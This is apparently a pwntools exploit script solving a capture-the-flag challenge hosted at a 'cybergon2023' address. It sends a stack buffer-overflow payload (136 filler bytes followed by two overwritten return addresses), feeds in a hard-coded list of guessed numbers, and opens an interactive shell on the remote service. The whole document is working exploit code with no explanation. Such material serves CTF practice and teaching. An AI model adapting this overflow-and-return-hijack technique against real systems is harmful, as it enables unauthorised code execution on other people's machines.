from pwn import *

# p = process("./random")
# gdb.attach(p)

p = remote("cybergon2023.webhop.me", 5003)

numbers = [-31, 239, -136, 201, -187, 223, -214, -94, 211, -28]

payload = b"A"*136 + p64(0x401016) + p64(0x4011b6)

p.recvuntil(b"What is your name?")
p.sendline(payload)
p.recvuntil(b"Guess my numbers!")
for n in numbers:
    p.sendline(str(n).encode())

p.interactive()